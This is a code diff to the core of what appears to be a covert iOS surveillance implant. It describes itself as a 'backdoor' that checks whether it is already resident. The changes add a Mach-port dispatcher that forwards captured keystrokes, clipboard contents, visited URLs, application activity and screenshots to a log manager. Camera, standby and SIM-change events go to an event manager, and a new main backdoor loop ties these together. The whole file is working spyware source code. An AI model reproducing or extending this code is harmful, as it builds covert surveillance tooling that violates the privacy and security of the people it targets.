@@ -13,6 +13,7 @@
 #import <fcntl.h>
 #import <sys/socket.h>
 #import <sys/un.h>
+#import <mach/message.h>
 
 #import "RCSICore.h"
 #import "RCSIUtils.h"
@@ -21,10 +22,12 @@
 #import "RCSITaskManager.h"
 #import "RCSIEncryption.h"
 #import "RCSIInfoManager.h"
+#import "RCSIEvents.h"
+#import "RCSIActions.h"
 
 #import "NSString+ComparisonMethod.h"
 
-//#define DEBUG
+#define DEBUG_
 
 #define VERSION             "0.9.0"
 #define GLOBAL_PERMISSIONS  0666
@@ -191,6 +194,130 @@ RCSISharedMemory  *mSharedMemoryLogging;
       [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.080]]; 
       
       [innerPool release];
+    }
+}
+
+typedef struct _coreMessage_t
+{
+  mach_msg_header_t header;
+  uint dataLen;
+} coreMessage_t;
+
+
+- (BOOL)sendMessageToMachPort:(NSMachPort*)machPort 
+                     withData:(NSData *)aData
+{
+  // notification port of manager is nil: manager is stopped
+  if (machPort == nil)
+    return FALSE;
+    
+  mach_port_t port = [machPort machPort];
+
+  coreMessage_t *message;
+  kern_return_t err;
+  uint theMsgLen = (sizeof(coreMessage_t) + [aData length]);
+  
+  // released by handleMachMessage
+  NSMutableData *theMsg = [[NSMutableData alloc] 
+                            initWithCapacity: theMsgLen];
+  
+  message = (coreMessage_t*) [theMsg bytes];
+  message->header.msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_MAKE_SEND);
+  message->header.msgh_local_port = MACH_PORT_NULL;
+  message->header.msgh_remote_port = port;
+  message->header.msgh_size = theMsgLen;
+  message->dataLen = [aData length];
+  
+  memcpy((u_char*)message + sizeof(coreMessage_t), [aData bytes], message->dataLen);
+  
+  err = mach_msg((mach_msg_header_t*)message, 
+                 MACH_SEND_MSG, 
+                 theMsgLen, 
+                 0, 
+                 MACH_PORT_NULL, 
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+     
+  [theMsg release];
+  
+  if( err != KERN_SUCCESS )
+    {
+#ifdef DEBUG
+      NSLog(@"%s: error sending message to port %d, [%#x]", __FUNCTION__, port, err);
+#endif
+    }
+  else
+    {
+#ifdef DEBUG
+     NSLog(@"%s: message sent to port %d [%#x] retainCount %d", __FUNCTION__, port, theMsg, [theMsg retainCount]);
+#endif
+    }
+    
+    return TRUE;
+}
+
+- (void)dispatchToLogManager:(NSData*)aMessage
+{
+  if (aMessage != nil) 
+    {
+      NSMachPort *machPort = [[RCSILogManager sharedInstance] notificationPort];
+      [self sendMessageToMachPort:machPort withData:aMessage];
+    }
+}
+
+- (void)dispatchToEventManager:(NSData*)aMessage
+{
+  if (aMessage != nil) 
+    {
+      NSMachPort *machPort = [[RCSIEvents sharedInstance] notificationPort];
+      [self sendMessageToMachPort:machPort withData:aMessage];
+    }
+}
+
+- (void)dispatchMessages:(NSData*)aMessage
+{
+  if (aMessage == nil)
+    return;
+    
+  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
+  
+  switch (message->agentID)
+  {
+    case LOG_URL:
+    case LOG_APPLICATION:
+    case LOG_CLIPBOARD:
+    case LOG_KEYLOG:
+    case LOG_SNAPSHOT:
+    {
+      [self dispatchToLogManager:aMessage];
+      break;
+    }
+    case EVENT_CAMERA_APP:
+    case EVENT_STANDBY:
+    case EVENT_SIM_CHANGE:
+    {
+      [self dispatchToEventManager: aMessage];
+      break;
+    }
+  }
+}
+
+- (void)coreRunLoop
+{
+  while (mMainLoopControlFlag != @"STOP")
+    {
+      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 1.000]]; 
+      
+      NSMutableArray *messages = [mSharedMemoryLogging fetchMessages];
+
+      for (int i=0; i < [messages count]; i++) 
+      {
+        [self dispatchMessages: [messages objectAtIndex:i]];
+      }
+    
+      [pool release];
     }
 }
 
@@ -383,7 +510,10 @@ RCSISharedMemory  *mSharedMemoryLogging;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance]; 
+  RCSITaskManager *taskManager   = [RCSITaskManager sharedInstance]; 
+  RCSILogManager  *logManager    = [RCSILogManager sharedInstance];
+  RCSIEvents      *eventManager  = [RCSIEvents sharedInstance];
+  RCSIActions     *actionManager = [RCSIActions sharedInstance];
   
   // Set the backdoorControlFlag to RUNNING
   mMainLoopControlFlag = @"RUNNING";
@@ -438,14 +568,10 @@ RCSISharedMemory  *mSharedMemoryLogging;
     return NO;
   
   [mSharedMemoryCommand zeroFillMemory];
-  
-  if ([mSharedMemoryLogging createMemoryRegion] == -1)
-    return NO;
 
-  if ([mSharedMemoryLogging attachToMemoryRegion: YES] == -1)
-    return NO;
-  
-  [mSharedMemoryLogging zeroFillMemory];
+  // Create named port for communicate with remote agents
+  // 
+  [mSharedMemoryLogging createCoreRLSource];
   
   if ([self isBackdoorAlreadyResident] == FALSE)
     {
@@ -470,12 +596,21 @@ RCSISharedMemory  *mSharedMemoryLogging;
       NSLog(@"%s: configuration loaded and running",__FUNCTION__);
 #endif
     }
+    
+  // start the logmanager to sync log on flash
+  [logManager start];
+  
+  // start the action manager triggering actions
+  [actionManager start];
+  
+  // initialize events instance to eventList
+  [taskManager startEvents];
+  
+  // start events manager for manage distribuited events source
+  [eventManager start];
   
   // Start enabled agents
   [taskManager startAgents];
-  
-  // Start events monitor
-  [taskManager startEvents];
   
   RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
@@ -484,7 +619,8 @@ RCSISharedMemory  *mSharedMemoryLogging;
   //
   // Main backdoor loop
   //
-  [self _communicateWithAgents];
+  //[self _communicateWithAgents];
+  [self coreRunLoop];
   
   [pool release];
   
